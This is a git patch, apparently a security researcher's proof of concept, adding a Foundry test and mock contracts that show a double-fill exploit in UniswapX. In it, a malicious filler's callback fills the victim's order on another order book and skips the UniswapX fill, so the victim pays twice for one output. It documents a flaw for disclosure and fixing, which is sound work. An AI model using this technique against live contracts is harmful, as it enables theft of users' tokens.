@@ -1,0 +1,162 @@
+Author: shung
+Date:   Sat Jul 22 16:02:53 2023 +0300
+
+    Apply diff at commit 7494d01d2efa7ef16aa3c4065e3fbd7db57c580c
+    of UniswapX repo. Test with `forge test --match-contract LimitOrderReactorTest --match-test testDoubleOrderFill`.
+
+diff --git a/test/base/BaseReactor.t.sol b/test/base/BaseReactor.t.sol
+index 935334b..8bc4bc6 100644
+--- a/test/base/BaseReactor.t.sol
++++ b/test/base/BaseReactor.t.sol
+@@ -18,6 +18,8 @@ import {MockERC20} from "../util/mock/MockERC20.sol";
+ import {MockFillContract} from "../util/mock/MockFillContract.sol";
+ import {NATIVE} from "../../src/lib/CurrencyLibrary.sol";
+
++import {MockOrderBook, MockMaliciousFillContract} from "../util/mock/MockMaliciousFillContract.sol";
++
+ abstract contract BaseReactorTest is GasSnapshot, ReactorEvents, Test, DeployPermit2 {
+     using OrderInfoBuilder for OrderInfo;
+     using ArrayBuilder for uint256[];
+@@ -85,6 +87,72 @@ abstract contract BaseReactorTest is GasSnapshot, ReactorEvents, Test, DeployPer
+         return (signedOrders, orderHashes);
+     }
+
++    /// @dev This is an exploit, this should not pass in the fixed version.
++    function testDoubleOrderFill() public {
++        // Deploy Mock contracts
++        MockOrderBook mockOrderBook = new MockOrderBook();
++        MockMaliciousFillContract fulfiller = new MockMaliciousFillContract(mockOrderBook, swapper, tokenOut);
++
++        // Seed both swapper and fillContract with enough tokens
++        tokenIn.mint(swapper, 200);
++        tokenOut.mint(address(fulfiller), 200);
++
++        // Approve permit2 and the mock order book, each for 100
++        tokenIn.forceApprove(swapper, address(permit2), 100);
++        tokenIn.forceApprove(swapper, address(mockOrderBook), 100);
++
++        // Malicious fulfiller will only fulfill order on mock book.
++        tokenOut.forceApprove(address(fulfiller), address(mockOrderBook), 100);
++
++        // Create order on Mock Order Book
++        // want amount: 100, give amount: 100
++        MockOrderBook.Order memory order = MockOrderBook.Order({
++            want: MockOrderBook.Item({
++                token: tokenOut,
++                amount: 100
++            }),
++            give: MockOrderBook.Item({
++                token: tokenIn,
++                amount: 100
++            })
++        });
++        vm.prank(swapper);
++        mockOrderBook.createOrder(order);
++
++        // Now create an order on UniswapX
++        ResolvedOrder[] memory resolvedOrders = new ResolvedOrder[](1);
++        resolvedOrders[0]= ResolvedOrder({
++            info: OrderInfoBuilder.init(address(reactor)).withSwapper(swapper).withDeadline(block.timestamp + 999999),
++            input: InputToken(tokenIn, 100, 100),
++            outputs: OutputsBuilder.single(address(tokenOut), 100, swapper),
++            sig: hex"00",
++            hash: bytes32(0)
++        });
++
++        (SignedOrder memory signedOrder,) = createAndSignOrder(resolvedOrders[0]);
++
++        uint256 swapperTokenInBalanceBefore = tokenIn.balanceOf(swapper);
++        uint256 swapperTokenOutBalanceBefore = tokenOut.balanceOf(swapper);
++        uint256 fulfillerTokenInBalanceBefore = tokenIn.balanceOf(address(fulfiller));
++        uint256 fulfillerTokenOutBalanceBefore = tokenOut.balanceOf(address(fulfiller));
++
++        // execute order
++        reactor.execute(signedOrder, fulfiller, bytes(""));
++
++        // Swapper should give 200 tokenIn, and should get 200 tokenOut
++        // However it will only get 100 tokenOut even though it gave 200 tokenIn.
++        // This is due to bug in UniswapX, not in the MockOrderBook.
++        assertEq(tokenIn.balanceOf(address(swapper)), swapperTokenInBalanceBefore - 200);
++        assertEq(tokenOut.balanceOf(address(swapper)), swapperTokenOutBalanceBefore + 100); // SWAPPER ONLY GOT 100 !!! THEY SHOULD HAVE GOT 200!
++        assertEq(tokenIn.balanceOf(address(fulfiller)), fulfillerTokenInBalanceBefore + 200);
++        assertEq(tokenOut.balanceOf(address(fulfiller)), fulfillerTokenOutBalanceBefore - 100); // FULFILLER ONLY SPENT 100 !!!
++
++        // In conclusion. Two orders made, each asking 100 tokenA, and each giving 100 tokenB. Due
++        // to using balanceBefore and after checks inappropriately in this context, the UniswapX
++        // order can be filled by filling order from another protocol! So victim only got 100
++        // tokenB but spent 200 tokenA!!!
++    }
++
+     /// @dev Basic execute test, checks balance before and after
+     function testBaseExecute(uint128 inputAmount, uint128 outputAmount, uint256 deadline) public {
+         vm.assume(deadline > block.timestamp);
+diff --git a/test/util/mock/MockMaliciousFillContract.sol b/test/util/mock/MockMaliciousFillContract.sol
+new file mode 100644
+index 0000000..1926737
+--- /dev/null
++++ b/test/util/mock/MockMaliciousFillContract.sol
+@@ -0,0 +1,26 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++pragma solidity ^0.8.0;
++
++import {ResolvedOrder} from "../../../src/base/ReactorStructs.sol";
++import {IReactorCallback} from "../../../src/interfaces/IReactorCallback.sol";
++
++import {MockOrderBook, ERC20} from "./MockOrderBook.sol";
++
++contract MockMaliciousFillContract is IReactorCallback {
++    MockOrderBook immutable public mockOrderBook;
++    address immutable public victim;
++
++    constructor(MockOrderBook book, address leVictim, ERC20 token) {
++        victim = leVictim;
++        mockOrderBook = book;
++        token.approve(address(book), 100);
++    }
++
++    function reactorCallback(ResolvedOrder[] memory, address, bytes memory) external {
++        // Fill mockOrderBook user (aka victim) order on mockOrderBook, which will also fill
++        // order on UniswapX. Double spending yay.
++        mockOrderBook.fillOrder(victim);
++
++        // Do not bother actually filling the order on UniswapX.
++    }
++}
+diff --git a/test/util/mock/MockOrderBook.sol b/test/util/mock/MockOrderBook.sol
+new file mode 100644
+index 0000000..5e1d767
+--- /dev/null
++++ b/test/util/mock/MockOrderBook.sol
+@@ -0,0 +1,32 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++pragma solidity ^0.8.0;
++
++import {ERC20} from "solmate/src/tokens/ERC20.sol";
++
++contract MockOrderBook {
++    struct Item {
++        ERC20 token;
++        uint256 amount;
++    }
++
++    struct Order {
++        Item want;
++        Item give;
++    }
++
++    mapping(address orderer => Order order) public orders;
++
++    function createOrder(Order calldata order) external {
++        orders[msg.sender] = order;
++    }
++
++    // this can be frontrun among other things, don't use in prod
++    function fillOrder(address orderer) external {
++        Order memory order = orders[orderer];
++
++        order.want.token.transferFrom(msg.sender, orderer, order.want.amount);
++        order.give.token.transferFrom(orderer, msg.sender, order.give.amount);
++
++        delete orders[orderer];
++    }
++}
